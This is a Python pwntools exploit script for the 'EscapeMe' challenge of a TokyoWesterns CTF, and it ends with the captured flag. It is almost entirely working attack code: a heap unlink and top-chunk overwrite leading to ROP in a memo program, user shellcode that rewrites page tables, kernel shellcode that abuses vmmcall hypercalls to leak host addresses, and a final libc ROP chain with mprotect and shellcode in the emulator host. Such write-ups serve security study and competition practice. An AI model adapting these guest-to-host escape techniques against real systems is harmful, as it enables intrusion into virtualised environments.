#!/usr/bin/env python2

from pwn import *
import sys
import os
import subprocess

host, port = 'escapeme.chal.ctf.westerns.tokyo', 16359
local = False
if len(sys.argv) == 1:
  host = '127.0.0.1'
  local = True

def proof_of_work():
    chal = r.recvline().strip()
    assert 'hashcash -mb' in chal
    print(chal)
    r.sendline(subprocess.check_output(chal, shell=True).strip())

if local:
    r = process(['strace', './kvm.elf', 'kernel.bin', 'memo-static.elf', 'flag2.txt'], stderr=open('/dev/pts/18', 'w+'))
    #  r = process(['./kvm.elf', 'kernel.bin', 'memo-static.elf', 'flag2.txt'])
else:
    r = remote(host, port)
    proof_of_work()
    r.sendlineafter('Any other modules? (space split) >', 'flag2.txt')

context.arch = 'amd64'

def pt():
    r.recvuntil('Exit')

def alloc(data):
    pt()
    r.sendline('1')
    r.sendafter('memo', data)

def edit(idx, data):
    pt()
    r.sendline('2')
    r.sendlineafter('id', str(idx))
    r.sendafter('memo', data)

def free(idx):
    pt()
    r.sendline('3')
    r.sendlineafter('id', str(idx))

mmap_ptr = 0x0000007fff1ff000
stack = 0x0000007fffffffb8 # return address of read in alloc
top_chunk_at = 0x604098
c_at = mmap_ptr + 0x20
alloc(
        # prepare args of mmap
        p64(0) + p32(0) + p32(0xffffffff) + p32(34) + p32(6) + p64(0x1000) + p64(0)
)
alloc('B' * 0x28)
alloc(flat(0, 0x51, c_at - 0x18, c_at - 0x10).ljust(0x28, 'C'))
alloc('D' * 0x28)
alloc('E' * 0x28)
alloc('F' * 0x28)
edit(3, 'D' * 0x20 + p64(0x50) + p8(0x30))
free(4)

fake_top = 0x604038
edit(2, p32(top_chunk_at)[0:3])
edit(1, p32(fake_top)[0:3])
for i in range(3):
    # dummy malloc
    alloc('\x00' * 40)

alloc('\x00' * 32 + p64(stack)) # let top chunk points to stack

# rop!
# ret 2 getint: 0x40055d
rbx = 0
rbp = stack - 0x10 + 0x80
pop_rbp = 0x400230
mmap = 0x400596
main = 0x400190
alloc(flat(rbx, rbp, 0x40055d, 0, 0))
#          ^ here is stack + 16
# now will call getnline(rbp-0x80, 88)
shellcode_at = 0x0000007fff1fe000
r.send(flat(
    # set rbp on heap
    pop_rbp, 0x606020 + 0x38,
    mmap, # args on rbp-0x38 ~ -0x18
    stack + 0x30, 
    0x40050d,
    stack, 0, 0, 0,
    shellcode_at
    ).ljust(88, '\x00'))

r.recvuntil('Added')

# read shellcode again, don't know why..
sc1 = asm(shellcraft.read(0, shellcode_at, 0x1000))
r.send(sc1)

# prevent read concat
sleep(0.1)

def mmap(addr, sz):
    return shellcraft.mmap(addr, sz, 6)

pause = shellcraft.read(0, 'rsp', 1)
shellcode = asm(
        mmap(0, 0x2000) + 'push rax\n' +
        shellcraft.write(1, 'rsp', 8) +
        'pop rbp' + shellcraft.munmap('rbp', 0x1000) +
        mmap(0x217000, 0x1000) +
        '''
        add rbp, 0x1000
        /* now, rbp points to a page table that 0x217000 will go through */
        add rbp, 0xb8 /* 0xb8 / 8 == 0x17 */
        mov QWORD PTR [rbp], 7
        mov QWORD PTR [rbp + 8], 0x1007
        mov QWORD PTR [rbp + 0x10], 0x2007
        mov QWORD PTR [rbp + 0x18], 0x3007
        ''' +
        # now 0x217000 points to the kernal base address
        # after read, invoke exit will be our kernel-shellcode
        shellcraft.read(0, 0x217000 + 0x1B5B, 0x300) +
        #  pause+
        shellcraft.exit(0)
        )

assert len(sc1) + len(shellcode) < 4096

r.send('\x90' * len(sc1) + shellcode)
# to prevent read concat
r.recvuntil('\x1f\xff\x7f\x00\x00\x00')

kernel_sc = asm('''
        /* create self page table */
        movabs rbp, 0x8040000000
        mov r11, rbp
        add r11, 0xa000
        mov QWORD PTR [r11 + 0x10], 0xa127
        mov QWORD PTR [r11 + 0x18], 0xa127
        mov QWORD PTR [r11 + 0x20], 0x400183
        /* now address (2 << 39 | 3 << 30 | 4 << 21) should point to 0x400000, i.e. libc */
        movabs rbp, 0x100c0800000
        /* stack_ptr @ 0x3f04c0 */
        mov rdi, 0x3f04c0
        call leak
        /* libc_ptr @ 0x3eb018 */
        mov rdi, 0x3eb018
        call leak
        movabs rdi, 0x8040009010 /* just an address for putting my input */
        mov rsi, 0x10
        call sys_read
        movabs rdi, 0x8040009010
        mov r12, QWORD PTR [rdi] /* argv */
        mov r13, QWORD PTR [rdi+8] /* libc */
        sub r12, 0x6b0 /* points to retaddr of read */
        sub r12, r13
        mov rdi, r12
        mov rsi, 0x200
        call read
        ret
    pause:
        movabs rdi, 0x8040009010 /* just an address for putting my input */
        mov rsi, 0x1
        call sys_read
        ret

    high:
        mov rbx, rdi
        shr rdi, 16
        call set_high
        shl rdi, 16
        sub rbx, rdi
        add rbx, rbp
        mov rdi, rbx
        ret
        
    read:
        call high
        call sys_read
        
    leak:
        call high
        mov rsi, 0x8
        call sys_write

    set_high:
        push rdi
        movabs r11, 0x8040000000
        add r11, 0xa000
        shl rdi, 16
        add rdi, 0x400183
        mov QWORD PTR [r11 + 0x20], rdi
        pop rdi
        ret

    sys_write:
        mov eax, 0x11
        mov rbx, rdi
        mov rcx, rsi
        mov rdx, 0
        vmmcall
        ret
    sys_read:
        mov eax, 0x10
        mov rbx, rdi
        mov rcx, rsi
        mov rdx, 0
        vmmcall
        ret
        ''')
log.info('len(kernel_sc) = ' + hex(len(kernel_sc)))
assert len(kernel_sc) < 0x300
r.send(kernel_sc)

argv = u64(r.recv(8))
log.info('argv @ ' + hex(argv))
libc = u64(r.recv(8)) - 0x18ead0
log.info('libc @ ' + hex(libc))
r.send(p64(argv) + p64(libc))

# rop time!
pop_rdi = libc + 0x000000000002155f
pop_rdx_rsi = libc + 0x00000000001306d9
ret = libc + 0x8aa
lib = ELF('libc-2.27.so')
lib.address = libc
r.send(flat(
    pop_rdi, (argv - 0x2000) & -4096,
    pop_rdx_rsi, 7, 0x3000,
    lib.symbols['mprotect'],
    argv - 0x6b0 + 0x100
    ).ljust(0x100, '\x00') + asm('''
        /* open('.') */
        mov rdi, 0x605000
        mov rax, 0x2e /* . */
        mov [rdi], rax
        mov rax, 2
        xor rsi, rsi
        cdq
        syscall

        /* getdents */
        mov rdi, rax
        mov rax, 0x4e
        mov rsi, 0x605000
        cdq
        mov dh, 0x10
        syscall

        /* write */
        mov rdi, 1
        mov rsi, 0x605000
        mov rdx, rax
        mov rax, 1
        syscall
    '''))
#  context.log_level = 'debug'
print repr(r.recvall())
# flag3-415254a0b8be92e0a976f329ad3331aa6bbea816.txt
# TWCTF{Or1g1n4l_Hyp3rc4ll_15_4_h07b3d_0f_bug5}
